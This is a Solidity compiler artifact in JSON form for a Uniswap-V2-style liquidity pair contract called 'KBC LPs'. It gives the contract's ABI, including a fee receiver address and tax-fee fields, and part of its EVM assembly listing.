{
	"src/Pair.sol": {
		"Pair": {
			"abi": [
				{
					"inputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Approval",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "sender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount0",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount1",
							"type": "uint256"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "Burn",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "sender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount0",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount1",
							"type": "uint256"
						}
					],
					"name": "Mint",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "sender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount0In",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount1In",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount0Out",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount1Out",
							"type": "uint256"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "Swap",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "uint112",
							"name": "reserve0",
							"type": "uint112"
						},
						{
							"indexed": false,
							"internalType": "uint112",
							"name": "reserve1",
							"type": "uint112"
						}
					],
					"name": "Sync",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Transfer",
					"type": "event"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "DOMAIN_SEPARATOR",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "FeeResiver",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "Lockmint",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "liquidity",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "MINIMUM_LIQUIDITY",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "PERMIT_TYPEHASH",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "_frozenBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "allowance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "approve",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "balanceOf",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "burn",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "amount0",
							"type": "uint256"
						},
						{
							"internalType": "uint256",
							"name": "amount1",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "decimals",
					"outputs": [
						{
							"internalType": "uint8",
							"name": "",
							"type": "uint8"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "factory",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "getReserves",
					"outputs": [
						{
							"internalType": "uint112",
							"name": "_reserve0",
							"type": "uint112"
						},
						{
							"internalType": "uint112",
							"name": "_reserve1",
							"type": "uint112"
						},
						{
							"internalType": "uint32",
							"name": "_blockTimestampLast",
							"type": "uint32"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "_token0",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "_token1",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "_taxfee",
							"type": "uint256"
						}
					],
					"name": "initialize",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "kLast",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "mint",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "liquidity",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "name",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "nonces",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						},
						{
							"internalType": "uint256",
							"name": "deadline",
							"type": "uint256"
						},
						{
							"internalType": "uint8",
							"name": "v",
							"type": "uint8"
						},
						{
							"internalType": "bytes32",
							"name": "r",
							"type": "bytes32"
						},
						{
							"internalType": "bytes32",
							"name": "s",
							"type": "bytes32"
						}
					],
					"name": "permit",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "price0CumulativeLast",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "price1CumulativeLast",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "skim",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "uint256",
							"name": "amount0Out",
							"type": "uint256"
						},
						{
							"internalType": "uint256",
							"name": "amount1Out",
							"type": "uint256"
						},
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "bytes",
							"name": "data",
							"type": "bytes"
						}
					],
					"name": "swap",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "symbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [],
					"name": "sync",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "taxfee",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "token0",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "token1",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "totalSupply",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "transfer",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "transferFrom",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"src/Pair.sol\":226:18384  contract Pair is IPair, ERC20 {... */\n  mstore(0x40, 0x80)\n    /* \"src/Pair.sol\":325:395  address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n  0x06\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n    /* \"src/Pair.sol\":353:395  0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n  0x9e94ee69f3cdcd5e74e05563736e4679da6db44c\n    /* \"src/Pair.sol\":325:395  address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n  or\n  swap1\n  sstore\n  0x01\n    /* \"src/Pair.sol\":1114:1139  uint private unlocked = 1 */\n  0x0f\n  sstore\n    /* \"src/Pair.sol\":2358:2416  constructor() public {... */\n  callvalue\n    /* \"--CODEGEN--\":5:7   */\n  dup1\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n  pop\n    /* \"src/ERC20.sol\":1203:1336  keccak256(... */\n  mload(0x40)\n    /* \"src/ERC20.sol\":1107:1114  chainid */\n  chainid\n  swap1\n    /* \"src/ERC20.sol\":1203:1336  keccak256(... */\n  dup1\n  0x52\n  data_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f\n  dup3\n  codecopy\n  0x40\n  dup1\n  mload\n  swap2\n  dup3\n  swap1\n  sub\n  0x52\n  add\n  dup3\n  keccak256\n    /* \"src/ERC20.sol\":1370:1374  name */\n  dup3\n  dup3\n  add\n  dup3\n  mstore\n  0x07\n  dup1\n  dup5\n  mstore\n  shl(0xc8, 0x4b4243204c5073)\n  0x20\n  swap5\n  dup6\n  add\n  mstore\n    /* \"src/ERC20.sol\":1404:1414  bytes(\"1\") */\n  dup3\n  mload\n  dup1\n  dup5\n  add\n  dup5\n  mstore\n  0x01\n  dup2\n  mstore\n  shl(0xf8, 0x31)\n  swap1\n  dup6\n  add\n  mstore\n    /* \"src/ERC20.sol\":1175:1485  abi.encode(... */\n  dup3\n  mload\n  dup1\n  dup6\n  add\n  swap3\n  swap1\n  swap3\n  mstore\n    /* \"src/ERC20.sol\":1354:1376  keccak256(bytes(name)) */\n  0x6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe\n    /* \"src/ERC20.sol\":1175:1485  abi.encode(... */\n  dup3\n  dup5\n  add\n  mstore\n    /* \"src/ERC20.sol\":1394:1415  keccak256(bytes(\"1\")) */\n  0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6\n    /* \"src/ERC20.sol\":1175:1485  abi.encode(... */\n  0x60\n  dup4\n  add\n  mstore\n  0x80\n  dup3\n  add\n  swap6\n  swap1\n  swap6\n  mstore\n    /* \"src/ERC20.sol\":1466:1470  this */\n  address\n    /* \"src/ERC20.sol\":1175:1485  abi.encode(... */\n  0xa0\n  dup1\n  dup4\n  add\n  swap2\n  swap1\n  swap2\n  mstore\n  dup3\n  mload\n    /* \"--CODEGEN--\":26:47   */\n  dup1\n  dup4\n  sub\n    /* \"--CODEGEN--\":22:54   */\n  swap1\n  swap2\n  add\n    /* \"--CODEGEN--\":6:55   */\n  dup2\n  mstore\n    /* \"src/ERC20.sol\":1175:1485  abi.encode(... */\n  0xc0\n  swap1\n  swap2\n  add\n  swap1\n  swap2\n  mstore\n    /* \"src/ERC20.sol\":1152:1495  keccak256(... */\n  dup1\n  mload\n  swap2\n  add\n  keccak256\n    /* \"src/ERC20.sol\":1133:1149  DOMAIN_SEPARATOR */\n  0x04\n    /* \"src/ERC20.sol\":1133:1495  DOMAIN_SEPARATOR = keccak256(... */\n  sstore\n  pop\n    /* \"src/Pair.sol\":2389:2409  factory = msg.sender */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n    /* \"src/Pair.sol\":2399:2409  msg.sender */\n  caller\n    /* \"src/Pair.sol\":2389:2409  factory = msg.sender */\n  or\n  swap1\n  sstore\n    /* \"src/Pair.sol\":226:18384  contract Pair is IPair, ERC20 {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\ndata_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f 454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429\n\nsub_0: assembly {\n        /* \"src/Pair.sol\":226:18384  contract Pair is IPair, ERC20 {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"src/Pair.sol\":226:18384  contract Pair is IPair, ERC20 {... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x70a08231\n      gt\n      tag_34\n      jumpi\n      dup1\n      0xbc25cf77\n      gt\n      tag_35\n      jumpi\n      dup1\n      0xdcbbb373\n      gt\n      tag_36\n      jumpi\n      dup1\n      0xdcbbb373\n      eq\n      tag_30\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_31\n      jumpi\n      dup1\n      0xf317739c\n      eq\n      tag_32\n      jumpi\n      dup1\n      0xfff6cae9\n      eq\n      tag_33\n      jumpi\n      jump(tag_2)\n    tag_36:\n      dup1\n      0xbc25cf77\n      eq\n      tag_26\n      jumpi\n      dup1\n      0xc45a0155\n      eq\n      tag_27\n      jumpi\n      dup1\n      0xd21220a7\n      eq\n      tag_28\n      jumpi\n      dup1\n      0xd505accf\n      eq\n      tag_29\n      jumpi\n      jump(tag_2)\n    tag_35:\n      dup1\n      0x900820d8\n      gt\n      tag_37\n      jumpi\n      dup1\n      0x900820d8\n      eq\n      tag_22\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_23\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_24\n      jumpi\n      dup1\n      0xba9a7a56\n      eq\n      tag_25\n      jumpi\n      jump(tag_2)\n    tag_37:\n      dup1\n      0x70a08231\n      eq\n      tag_18\n      jumpi\n      dup1\n      0x7464fc3d\n      eq\n      tag_19\n      jumpi\n      dup1\n      0x7ecebe00\n      eq\n      tag_20\n      jumpi\n      dup1\n      0x89afcb44\n      eq\n      tag_21\n      jumpi\n      jump(tag_2)\n    tag_34:\n      dup1\n      0x23b872dd\n      gt\n      tag_38\n      jumpi\n      dup1\n      0x47d5d856\n      gt\n      tag_39\n      jumpi\n      dup1\n      0x47d5d856\n      eq\n      tag_14\n      jumpi\n      dup1\n      0x5909c0d5\n      eq\n      tag_15\n      jumpi\n      dup1\n      0x5a3d5493\n      eq\n      tag_16\n      jumpi\n      dup1\n      0x6a627842\n      eq\n      tag_17\n      jumpi\n      jump(tag_2)\n    tag_39:\n      dup1\n      0x23b872dd\n      eq\n      tag_10\n      jumpi\n      dup1\n      0x30adf81f\n      eq\n      tag_11\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_12\n      jumpi\n      dup1\n      0x3644e515\n      eq\n      tag_13\n      jumpi\n      jump(tag_2)\n    tag_38:\n      dup1\n      0x095ea7b3\n      gt\n      tag_40\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x0dfe1681\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x1794bb3c\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_9\n      jumpi\n      jump(tag_2)\n    tag_40:\n      dup1\n      0x022c0d9f\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x06fdde03\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x0902f1ac\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"src/Pair.sol\":11600:14446  function swap(... */\n    tag_3:\n      tag_41\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0x80\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_42\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_42:\n        /* \"src/Pair.sol\":11600:14446  function swap(... */\n      dup2\n      calldataload\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n      0x40\n      dup4\n      add\n      calldataload\n      and\n      swap2\n      swap1\n      dup2\n      add\n      swap1\n      0x80\n      dup2\n      add\n      0x60\n      dup3\n      add\n      calldataload\n        /* \"--CODEGEN--\":21:32   */\n      0x0100000000\n        /* \"--CODEGEN--\":5:33   */\n      dup2\n      gt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_43\n      jumpi\n        /* \"--CODEGEN--\":46:47   */\n      0x00\n        /* \"--CODEGEN--\":43:44   */\n      dup1\n        /* \"--CODEGEN--\":36:48   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_43:\n        /* \"src/Pair.sol\":11600:14446  function swap(... */\n      dup3\n      add\n        /* \"--CODEGEN--\":35:44   */\n      dup4\n        /* \"--CODEGEN--\":28:32   */\n      0x20\n        /* \"--CODEGEN--\":12:26   */\n      dup3\n        /* \"--CODEGEN--\":8:33   */\n      add\n        /* \"--CODEGEN--\":5:45   */\n      gt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_44\n      jumpi\n        /* \"--CODEGEN--\":58:59   */\n      0x00\n        /* \"--CODEGEN--\":55:56   */\n      dup1\n        /* \"--CODEGEN--\":48:60   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_44:\n        /* \"src/Pair.sol\":11600:14446  function swap(... */\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap2\n        /* \"--CODEGEN--\":100:109   */\n      dup5\n        /* \"--CODEGEN--\":95:96   */\n      0x01\n        /* \"--CODEGEN--\":81:93   */\n      dup4\n        /* \"--CODEGEN--\":77:97   */\n      mul\n        /* \"--CODEGEN--\":67:75   */\n      dup5\n        /* \"--CODEGEN--\":63:98   */\n      add\n        /* \"--CODEGEN--\":60:110   */\n      gt\n        /* \"--CODEGEN--\":39:50   */\n      0x0100000000\n        /* \"--CODEGEN--\":25:37   */\n      dup4\n        /* \"--CODEGEN--\":22:51   */\n      gt\n        /* \"--CODEGEN--\":11:118   */\n      or\n        /* \"--CODEGEN--\":8:10   */\n      iszero\n      tag_45\n      jumpi\n        /* \"--CODEGEN--\":131:132   */\n      0x00\n        /* \"--CODEGEN--\":128:129   */\n      dup1\n        /* \"--CODEGEN--\":121:133   */\n      revert\n        /* \"--CODEGEN--\":8:10   */\n    tag_45:\n      pop\n        /* \"src/Pair.sol\":11600:14446  function swap(... */\n      swap1\n      swap3\n      pop\n      swap1\n      pop\n      tag_46\n      jump\t// in\n    tag_41:\n      stop\n        /* \"src/ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n    tag_4:\n      tag_47\n      tag_48\n      jump\t// in\n    tag_47:\n      0x40\n      dup1\n      mload\n      0x20\n      dup1\n      dup3\n      mstore\n      dup4\n      mload\n      dup2\n      dup4\n      add\n      mstore\n      dup4\n      mload\n      swap2\n      swap3\n      dup4\n      swap3\n      swap1\n      dup4\n      add\n      swap2\n      dup6\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_49:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_51\n      jumpi\n        /* \"--CODEGEN--\":90:101   */\n      dup2\n      dup2\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":71:82   */\n      dup4\n      dup3\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_49)\n    tag_51:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"src/ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_52\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_52:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"src/Pair.sol\":1280:1581  function getReserves()... */\n    tag_5:\n      tag_53\n      tag_54\n      jump\t// in\n    tag_53:\n      0x40\n      dup1\n      mload\n      sub(shl(0x70, 0x01), 0x01)\n      swap5\n      dup6\n      and\n      dup2\n      mstore\n      swap3\n      swap1\n      swap4\n      and\n      0x20\n      dup4\n      add\n      mstore\n      0xffffffff\n      and\n      dup2\n      dup4\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x60\n      add\n      swap1\n      return\n        /* \"src/ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_6:\n      tag_55\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_56\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_56:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_57\n      jump\t// in\n    tag_55:\n      0x40\n      dup1\n      mload\n      swap2\n      iszero\n      iszero\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/Pair.sol\":587:608  address public token0 */\n    tag_7:\n      tag_58\n      tag_59\n      jump\t// in\n    tag_58:\n      0x40\n      dup1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/Pair.sol\":2478:2752  function initialize(... */\n    tag_8:\n      tag_41\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_61\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_61:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":2478:2752  function initialize(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      add\n      calldataload\n      tag_62\n      jump\t// in\n        /* \"src/ERC20.sol\":307:333  uint256 public totalSupply */\n    tag_9:\n      tag_63\n      tag_64\n      jump\t// in\n    tag_63:\n      0x40\n      dup1\n      mload\n      swap2\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/ERC20.sol\":3108:3469  function transferFrom(... */\n    tag_10:\n      tag_55\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_66\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_66:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":3108:3469  function transferFrom(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      add\n      calldataload\n      tag_67\n      jump\t// in\n        /* \"src/ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_11:\n      tag_63\n      tag_69\n      jump\t// in\n        /* \"src/ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n    tag_12:\n      tag_70\n      tag_71\n      jump\t// in\n    tag_70:\n      0x40\n      dup1\n      mload\n      0xff\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/ERC20.sol\":515:546  bytes32 public DOMAIN_SEPARATOR */\n    tag_13:\n      tag_63\n      tag_73\n      jump\t// in\n        